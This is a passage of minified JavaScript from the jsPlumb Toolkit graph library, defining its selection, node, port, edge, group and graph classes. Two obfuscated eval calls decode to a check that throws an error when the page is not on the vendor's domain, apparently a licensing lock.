    window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    var a = this, b = a.jsPlumbToolkitUtil, c = a.jsPlumbUtil;
    b.Selection = function (a) {
        c.EventGenerator.apply(this, arguments);
        var d, e = a.toolkit, f = [], g = [], h = [], i = Math.Infinity, j = Math.Infinity, k = Math.Infinity,
            l = a.generator, m = {}, n = this, o = a.onClear || function () {
            }, p = function (a) {
                return "Edge" === a.objectType ? h : "Node" === a.objectType ? f : g
            }, q = function (a) {
                var c = [], e = p(a), f = "Edge" === a.objectType ? j : "Node" === a.objectType ? i : k;
                if (e.length >= f) {
                    if (d === b.Selection.DISCARD_NEW) return !1;
                    c = e.splice(0, 1), r(c[0], "Removed"), delete m[c[0].getFullId()]
                }
                return e.push(a), r(a, "Added"), c
            }, r = function (a, b) {
                var c = a.objectType.toLowerCase() + b, d = {
                    Group: {data: a.data, group: a},
                    Node: {data: a.data, node: a},
                    Port: {data: a.data, node: a.node, port: a},
                    Edge: {data: a.data, edge: a}
                };
                n.fire(c, d[a.objectType])
            };
        this.getModel = e.getModel, this.setSuspendGraph = e.setSuspendGraph, this.getNodeId = e.getNodeId, this.getGroupId = e.getNodeId, this.getEdgeId = e.getEdgeId, this.getPortId = e.getPortId, this.getNodeType = e.getNodeType, this.getGroupType = e.getNodeType, this.getEdgeType = e.getEdgeType, this.getPortType = e.getPortType, this.getObjectInfo = e.getObjectInfo, this.isDebugEnabled = e.isDebugEnabled;
        var s = function (a, b) {
            if (!m[a.getFullId()]) {
                var c = q(a);
                return !1 === c ? [[], []] : (m[a.getFullId()] = a, b && b(a, !0), [[a], c])
            }
            return [[], []]
        }, t = function (a, b) {
            return c.removeWithFunction(p(a), function (b) {
                return b.id == a.id
            }) && r(a, "Removed"), delete m[a.getFullId()], b && b(a, !1), [[], []]
        }, u = function (a, b) {
            return m[a.getFullId()] ? t(a, b) : s(a, b)
        }, v = function (a, b, d) {
            var f, g = [], h = [];
            if (null == a) return g;
            var i = function (a) {
                var j;
                if (c.isString(a)) null != (j = e.getNode(a) || e.getEdge(a) || e.getGroup(a)) && (f = b(j, d), g.push.apply(g, f[0]), h.push.apply(h, f[1])); else if (a.eachNode && a.eachEdge) a.eachNode(function (a, b) {
                    i(b)
                }), a.eachEdge(function (a, b) {
                    i(b)
                }), a.eachGroup && a.eachGroup(function (a, b) {
                    i(b)
                }); else if (a.each) a.each(function (a, b) {
                    i(b.vertex || b)
                }); else if (null != a.length) for (var k = 0; k < a.length; k++) i(a[k], d); else f = b(a, d), g.push.apply(g, f[0]), h.push.apply(h, f[1])
            };
            return i(a), [g, h]
        }.bind(this);
        e.bind("nodeRemoved", function (a) {
            t(a.node)
        }), e.bind("groupRemoved", function (a) {
            t(a.group)
        }), e.bind("portRemoved", function (a) {
            t(a.port)
        }), e.bind("edgeRemoved", function (a) {
            t(a.edge)
        }), e.bind("edgeTarget", function (a) {
            m[a.edge.getFullId()] && n.fire("edgeTarget", a)
        }), e.bind("edgeSource", function (a) {
            m[a.edge.getFullId()] && n.fire("edgeSource", a)
        }), e.bind("nodeUpdated", function (a) {
            m[a.node.getFullId()] && n.fire("nodeUpdated", a)
        }), e.bind("groupUpdated", function (a) {
            m[a.group.getFullId()] && n.fire("groupUpdated", a)
        }), e.bind("edgeUpdated", function (a) {
            m[a.edge.getFullId()] && n.fire("edgeUpdated", a)
        }), e.bind("portUpdated", function (a) {
            m[a.port.getFullId()] && n.fire("portUpdated", a)
        }), this.remove = function (a, b) {
            return v(a, t, b)
        }, this.append = function (a, b) {
            return v(a, s, b)
        }, this.toggle = function (a, b) {
            return v(a, u, b)
        }, this.setMaxNodes = function (a) {
            i = a
        }, this.setMaxEdges = function (a) {
            j = a
        }, this.setCapacityPolicy = function (a) {
            d = a
        }, this.clear = function (a) {
            f.length = 0, h.length = 0, g.length = 0, m = {}, a || o(this)
        }, this.reload = function () {
            if (null != l) {
                this.clear();
                var a;
                for (this.fire("dataLoadStart"), l(this, e), a = 0; a < g.length; a++) n.fire("groupAdded", g[a]);
                for (a = 0; a < f.length; a++) n.fire("nodeAdded", f[a]);
                for (a = 0; a < h.length; a++) n.fire("edgeAdded", h[a]);
                this.fire("dataLoadEnd")
            }
        }, this.each = function (a, b) {
            for (var d = "Edge" === b ? h : "Group" === b ? g : f, e = 0; e < d.length; e++) try {
                a(e, d[e])
            } catch (a) {
                c.log("Selection iterator function failed", a)
            }
        }, this.eachNode = this.each, this.eachGroup = function (a) {
            this.each(a, "Group")
        }, this.eachNodeOrGroup = function (a) {
            this.each(a, "Node"), this.each(a, "Group")
        }, this.eachEdge = function (a) {
            this.each(a, "Edge")
        }, this.getNodeCount = function () {
            return f.length
        }, this.getNodeAt = function (a) {
            return f[a]
        }, this.getNodes = function () {
            return f
        }, this.getNode = e.getNode, this.getGroupAt = function (a) {
            return g[a]
        }, this.getGroups = function () {
            return g
        }, this.getGroup = e.getGroup, this.getGroupCount = function () {
            return g.length
        }, this.getAll = function () {
            var a = [];
            return Array.prototype.push.apply(a, f), Array.prototype.push.apply(a, h), Array.prototype.push.apply(a, g), a
        }, this.getAllEdgesFor = function (a) {
            for (var b = a.getAllEdges(), c = [], d = 0; d < b.length; d++) null != m[b[d].getId()] && c.push(b[d]);
            return c
        }, this.getEdgeCount = function () {
            return h.length
        }, this.get = this.getNodeAt = function (a) {
            return f[a]
        }, this.getEdge = this.getEdgeAt = function (a) {
            return h[a]
        }, this.getEdges = function () {
            return h
        }, this.setCapacityPolicy(b.Selection.DISCARD_EXISTING)
    }, b.Selection.DISCARD_EXISTING = "discardExisting", b.Selection.DISCARD_NEW = "discardNew"
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = a.jsPlumbGraph = {};
    b.version = "0.1", b.name = "jsPlumbGraph";
    var c = function (a, b) {
        var c = {};
        this.setAttribute = function (a, b) {
            c[a] = b
        }, this.getAttribute = function (a) {
            return c[a]
        };
        var d = b.getType(a || {});
        this.getType = function () {
            return d
        }, this.setType = function (a) {
            d = a
        }, this.graph = b
    }, d = function () {
        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (a) {
            var b = 16 * Math.random() | 0;
            return ("x" == a ? b : 3 & b | 8).toString(16)
        })
    }, e = function (a, b, c) {
        return null == a ? d() : "string" == typeof a ? a : (b || c.getIdFunction())(a) || d()
    }, f = function (a) {
        return "string" == typeof a ? {id: a} : a
    }, g = b.Vertex = b.Node = function (a, d, g) {
        c.apply(this, [a, g]), this.objectType = "Node", this.id = e(a, d, g), this.data = f(a), this.getFullId = function () {
            return this.id
        };
        var i = [], j = 0, k = 0, l = [], m = [], n = {};
        this.getEdges = function (a) {
            if (null == a || null == a.filter) return i;
            for (var b = [], c = 0; c < i.length; c++) a.filter(i[c]) && b.push(i[c]);
            return b
        }, this.getSourceEdges = function () {
            return this.getEdges({
                filter: function (a) {
                    return a.source == this
                }.bind(this)
            })
        }, this.getTargetEdges = function () {
            return this.getEdges({
                filter: function (a) {
                    return a.target == this
                }.bind(this)
            })
        }, this.addEdge = function (a) {
            i.push(a), a.source !== this && a.isDirected() || k++, a.target !== this && a.isDirected() || j++
        }, this.deleteEdge = function (a) {
            for (var b = -1, c = 0; c < i.length; c++) if (i[c].getId() === a.getId()) {
                b = c;
                break
            }
            return b > -1 && (i.splice(b, 1), a.source !== this && a.isDirected() || k--, a.target !== this && a.isDirected() || j--, !0)
        }, this.getAllEdges = function (a) {
            for (var b = this.getEdges(a).slice(0), c = 0; c < l.length; c++) b.push.apply(b, l[c].getEdges(a));
            return b
        }, this.addGraph = function (a) {
            return a = "string" == typeof a ? new b.Graph({id: a}) : a, m.push(a), a.id || (a.id = "" + m.length), a
        }, this.getGraph = function (a) {
            for (var b = 0; b < m.length; b++) if (m[b].id === a) return m[b]
        }, this.getIndegreeCentrality = function () {
            for (var a = 0, b = 0; b < l.length; b++) a += l[b].getIndegreeCentrality();
            return j + a
        }, this.getOutdegreeCentrality = function () {
            for (var a = 0, b = 0; b < l.length; b++) a += l[b].getOutdegreeCentrality();
            return k + a
        }, this.getPorts = function () {
            return l
        }, this.addPort = function (a, b) {
            var c = e(a, b, g), d = this.getPort(c);
            return null == d && (d = new h(a, b, this), l.push(d), n[d.id] = d), d
        }, this.setPort = function (a, b) {
            var c = this.getPort(a);
            return c || (c = this.addPort({id: a})), c.data = b, c.setType(this.graph.getType(b)), c
        }, this.getPort = function (a) {
            return n[a]
        };
        var o = function (a) {
            return a.constructor == b.Port ? a.id : a
        };
        this.removePort = function (a) {
            if (a) {
                for (var b = o(a), c = -1, d = !1, e = 0; e < l.length; e++) if (l[e].id === b) {
                    c = e;
                    break
                }
                if (-1 != c) {
                    var f = l[c];
                    g.deleteVertex(f), l.splice(c, 1), d = !0
                }
                delete n[b]
            }
            return d
        };
        var p = 0, q = {};
        this.setDefaultInternalCost = function (a) {
            p = a
        }, this.getInternalEdge = function (a, b) {
            var c = o(a), d = o(b), e = {source: n[c], target: n[d], cost: 1 / 0};
            if (e.source && e.target) {
                var f = q[c + "-" + d] || {cost: p, directed: !1};
                for (var g in f) e[g] = f[g]
            }
            return e
        }, this.setInternalEdge = function (a, b, c, d) {
            var e = o(a), f = o(b);
            return q[e + "-" + f] = {cost: c || p, directed: d}, this.getInternalEdge(a, b)
        }, this.inspect = function () {
            for (var a = "{ id:" + this.id + ", edges:[\n", b = 0; b < i.length; b++) a += i[b].inspect() + "\n";
            return a += "]}"
        }
    }, h = b.Port = function (a, b, c) {
        g.apply(this, [a, b, c.graph]), this.objectType = "Port", this.getNode = function () {
            return c
        }, this.getFullId = function () {
            return c.id + this.graph.getPortSeparator() + this.id
        }, this.isChildOf = function (a) {
            return c == a
        }, this.getPorts = this.addPort = this.deletePort = this.getPort = null
    }, i = b.Edge = function (a) {
        c.call(this, a.data, a.graph), this.source = a.source, this.target = a.target, this.objectType = "Edge";
        var b = a.cost || 1, d = !(!1 === a.directed), e = a.id;
        this.data = a.data || {}, this.getCost = function () {
            return b
        }, this.setCost = function (a) {
            b = a
        }, this.getId = this.getFullId = function () {
            return null === e ? this.source.id + "_" + this.target.id : e
        }, this.setId = function (a) {
            e = a
        }, this.isDirected = function () {
            return d
        }, this.setDirected = function (a) {
            d = a
        }, this.inspect = function () {
            if (null != e) return "{ id:" + e + ", connectionId:null, cost:" + b + ", directed:" + d + ", source:" + this.source.id + ", target:" + this.target.id + "}"
        }
    }, j = b.Group = function (a, b, c) {
        g.apply(this, arguments), this.objectType = "Group";
        var d = [], e = {};
        this.addVertex = this.addNode = function (a) {
            return null == e[a.id] && (d.push(a), e[a.id] = a, a.group = this, !0)
        }, this.getVertexCount = this.getNodeCount = function () {
            return d.length
        }, this.getVertices = this.getNodes = function () {
            return d
        }, this.deleteVertex = this.deleteNode = function (a) {
            if (a = "string" == typeof a ? e[a] : a) {
                var b = d.indexOf(a);
                -1 != b && (d.splice(b, 1), delete e[a.id]), delete a.group
            }
        }, this.cleanup = function (a) {
            var b, e = this.getAllDirectEdges(), f = e.length;
            for (b = 0; b < f; b++) c.deleteEdge(e[0]);
            var g = d.length;
            for (b = 0; b < g; b++) a ? c.deleteVertex(d[0]) : delete d[0].group;
            d.length = 0
        }, this.getAllDirectEdges = function (a) {
            var b, c = [];
            c.push.apply(c, this.getEdges(a).slice(0));
            var d = this.getPorts();
            for (b = 0; b < d.length; b++) c.push.apply(c, d[b].getEdges(a));
            return c
        }, this.getAllEdges = function (a) {
            for (var b = [], c = {}, e = 0; e < d.length; e++) Array.prototype.push.apply(b, d[e].getAllEdges(a).filter(function (a) {
                var b = a.getId(), d = null == c[b];
                return c[b] = !0, d
            }));
            return b.push.apply(b, this.getAllDirectEdges(a)), b
        }
    }, k = b.Cluster = function (a) {
        this.vertices = [a], this.addVertex = function (a) {
            this.vertices.push(a)
        }
    }, l = (b.Graph = function (a) {
        a = a || {}, this.vertices = [], this.edges = [], this.groups = [], this.id = a.id;
        var c = {}, d = 0, f = {}, h = 0, l = {}, m = 0, n = !(!1 === a.defaultDirected), q = a.defaultCost || 1,
            r = a.idFunction || function (a) {
                return a.id
            }, s = a.typeFunction || function (a) {
                return a.type || "default"
            }, t = !0 === a.enableSubgraphs, u = a.portSeparator || ".", v = {}, w = function (a) {
                delete v[a.id]
            }, x = function (a) {
                v[a.id] = a
            }, y = function () {
                v = {}
            };
        this.setIdFunction = function (a) {
            r = a
        }, this.getIdFunction = function () {
            return r
        }, this.setTypeFunction = function (a) {
            s = a
        }, this.getType = function (a) {
            return s(a)
        }, this.getTopLevelElements = function () {
            return v
        }, this.setEnableSubgraphs = function (a) {
            t = a
        }, this.setPortSeparator = function (a) {
            u = a
        }, this.getPortSeparator = function () {
            return u
        };
        var z = function (a, d) {
            if (null == a) return null;
            if ("string" != typeof a) {
                if (a.constructor == b.Port || a.constructor == b.Node || a.constructor == b.Group) return a;
                var e = a;
                if ("string" != typeof(a = r(a))) return e
            }
            var f = t ? a.split("/") : [a], g = function (a) {
                if (c[a]) return c[a];
                if (l[a]) return l[a];
                var b = a.split(u), e = b[0], f = c[e] || l[e];
                if (2 === b.length && null != f) {
                    var g = f.getPort(b[1]);
                    return null == g && d && (g = f.addPort(b[1])), g
                }
                return f
            };
            if (1 == f.length) return g(f[0]);
            if (f.length > 1 && f % 2 == 0) throw"Subgraph path format error.";
            for (var h = null, i = null, j = 0; j < f.length - 1; j += 2) h = g(f[j]), i = h.getGraph(f[j + 1]);
            return i.getVertex(f[f.length - 1])
        };
        this.clear = function () {
            this.vertices.length = 0, this.groups.length = 0, d = 0, h = 0, c = {}, f = {}, l = {}, y()
        }, this.getVertices = this.getNodes = function () {
            return this.vertices
        }, this.getVertexCount = this.getNodeCount = function () {
            return this.vertices.length
        }, this.getVertexAt = this.getNodeAt = function (a) {
            return this.vertices[a]
        }, this.getEdgeCount = function () {
            return h
        }, this.addEdge = function (a, b, c) {
            var d = null == a.directed ? !0 === n : !(!1 === a.directed), g = a.cost || q, j = e(a.data, b, this),
                k = z(a.source, !0), l = z(a.target, !0);
            if (null == k || null == k.objectType) throw new TypeError("Unknown source node [" + a.source + "]");
            if (null == l || null == l.objectType) throw new TypeError("Unknown target node [" + a.target + "]");
            if (c && !c(k, l)) return null;
            var m = new i({source: k, target: l, cost: g, directed: d, data: a.data || {}, id: j, graph: this});
            return m.source.addEdge(m), m.source !== m.target && m.target.addEdge(m), f[j] = m, h++, m
        }, this.addVertex = this.addNode = function (a, b) {
            var e = new g(a, b || r, this);
            return c[e.id] ? null : (this.vertices.push(e), c[e.id] = e, e._id = d++, x(e), e)
        }, this.addVertices = this.addNodes = function (a, b) {
            for (var c = 0; c < a.length; c++) this.addVertex(a[c], b || r)
        }, this.addGroup = function (a, b) {
            var c = new j(a, b || r, this);
            return l[c.id] ? l[c.id] : (this.groups.push(c), l[c.id] = c, c._id = m++, x(c), c)
        }, this.getGroupCount = function () {
            return this.groups.length
        }, this.getGroupAt = function (a) {
            return this.groups[a]
        }, this.getGroups = function () {
            return this.groups
        }, this.addVertexToGroup = function (a, b) {
            b = "string" == typeof b ? l[b] : b, (a = z(a)) && b && (b.addVertex(a), w(a))
        }, this.addVerticesToGroup = function (a, b) {
            for (var c = 0; c < a.length; c++) this.addVertexToGroup(a[c], b)
        }, this.deleteVertexFromGroup = function (a) {
            (a = z(a)) && a.group && (a.group.deleteVertex(a), x(a))
        }, this.deleteVerticesFromGroup = function (a, b) {
            for (var c = 0; c < a.length; c++) this.deleteVertexFromGroup(a[c], b)
        }, this.deleteGroup = function (a, b) {
            if (a = "string" == typeof a ? l[a] : a) {
                a.cleanup(b), delete l[a.id];
                for (var c = -1, d = 0; d < this.groups.length; d++) if (this.groups[d].id === a.id) {
                    c = d;
                    break
                }
                return c > -1 && this.groups.splice(c, 1), w(a), a
            }
        }, this.getGroup = function (a) {
            return "string" == typeof a ? l[a] : a
        }, this.deleteVertex = this.deleteNode = function (a) {
            var b = z(a);
            if (b) {
                for (var e = -1, f = 0; f < this.vertices.length; f++) if (this.vertices[f].id === b.id) {
                    e = f;
                    break
                }
                e > -1 && (this.vertices.splice(e, 1), null != b.group && b.group.deleteVertex(b));
                for (var g = b.getEdges(), i = 0; i < g.length; i++) this.deleteEdge(g[i]);
                if (h -= g.length, b.getPorts) for (var j = b.getPorts(), k = 0; k < j.length; k++) this.deleteVertex(j[k]);
                delete c[b.id], d--, w(b)
            }
        }, this.deleteEdge = function (a) {
            if (null != (a = this.getEdge(a))) {
                var b = z(a.source);
                b && b.deleteEdge(a) && h--;
                var c = z(a.target);
                c && c.deleteEdge(a), delete f[a.getId()]
            }
        }, this.getEdge = function (a) {
            if (null != a) {
                if ("string" != typeof a) {
                    if (a.constructor == b.Edge) return a;
                    var c = a;
                    if ("string" != typeof(a = r(a))) return c
                }
                return f[a]
            }
        }, this.getEdges = function (a) {
            a = a || {};
            var b, c = a.source, d = a.target, e = a.filter || function () {
                return !0
            }, g = function (a) {
                return !(null != c && a.source == j !== c || null != d && a.target == j !== d)
            }, h = [], i = function (a) {
                e(a) && g(a) && h.push(a)
            };
            if (a.node) {
                var j = z(a.node), k = j.getAllEdges();
                for (b = 0; b < k.length; b++) i(k[b])
            } else for (b in f) i(f[b]);
            return h
        }, this.getAllEdges = function () {
            var a = [];
            for (var b in f) a.push(f[b]);
            return a
        }, this.findPath = function (a, b, c, d, e) {
            return a = z(a), b = z(b), p.compute({
                graph: this,
                source: a,
                target: b,
                strict: !(!1 === c),
                nodeFilter: d,
                edgeFilter: e
            })
        }, this.getDistance = function (a, b, c) {
